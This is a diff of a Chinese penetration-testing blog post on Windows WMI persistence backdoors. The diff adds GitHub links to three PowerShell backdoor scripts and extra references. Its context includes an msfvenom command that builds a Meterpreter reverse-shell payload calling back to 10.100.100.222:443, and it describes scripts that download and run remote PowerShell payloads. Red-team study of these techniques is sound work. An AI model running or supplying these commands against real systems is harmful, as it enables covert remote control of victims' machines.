@@ -124,7 +124,7 @@ WMI的相关内容这里不介绍了，参见[WMI相关知识学习](https://pyt
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.100.222 LPORT=443 -f psh-reflection -a x64 --platform windows -o psh.ps1
 ```
-1、执行cmd命令或者启动本地payload.exe，支持启动触发、用户登录触发、周期触发和定时触发。[WMI-Persistence-local-exe](xxxxxxxx)，具体使用参见脚本源码的example。  
+1、执行cmd命令或者启动本地payload.exe，支持启动触发、用户登录触发、周期触发和定时触发。[WMI-Persistence-local-exe](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/WMI-Persistence-local-exe.ps1)，具体使用参见脚本源码的example。  
 添加后门  
 ```
 Import-Module .\WMI-Persistence.ps1
@@ -138,7 +138,7 @@ Import-Module .\WMI-Persistence.ps1
 Remove-Persistence
 ```
 
-2、下载远端powershell payload并执行，支持启动触发。[WMI-Persistence-remote-powershell-startup](xxxxx)。  
+2、下载远端powershell payload并执行，支持启动触发。[WMI-Persistence-remote-powershell-startup](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/WMI-Persistence-remote-powershell-startup.ps1)。  
 添加后门  
 ```
 Import-Module .\WMI-Persistence.ps1
@@ -150,7 +150,7 @@ Import-Module .\WMI-Persistence.ps1
 Remove-Persistence
 ```
 
-3、下载远端powershell payload并执行，支持用户登录触发、周期触发和定时触发。[WMI-Backdoor-remote-powershell](xxxxx)，具体使用参见脚本源码的example。  
+3、下载远端powershell payload并执行，支持用户登录触发、周期触发和定时触发。[WMI-Backdoor-remote-powershell](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/WMIBackdoor.ps1)，具体使用参见脚本源码的example。  
 添加后门  
 ```
 Import-Module .\WMIBackdoor.ps1
@@ -167,3 +167,7 @@ Remove-WMIBackdoor PWN
 * [渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)  
 * [windows后渗透维权](http://www.landq.cn/2019/09/01/windows%E5%90%8E%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83/)  
 * [域渗透——Hook PasswordChangeNotify](https://3gstudent.github.io/3gstudent.github.io/about/)
+* [Persistence – WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)
+* [利用WMI构建一个持久化的异步的无文件后门](https://m0nst3r.me/pentest/利用WMI构建一个持久化的异步的无文件后门.html)
+* [WMI中的SQL,WQL简明教程系列](http://blog.useasp.net/archive/2013/06/15/the-tutorial-series-of-wql-that-the-sql-in-wmi-chapter-one-keywords.aspx)
+* [Microsoft Docs - Windows Management Instrumentation](https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-start-page)
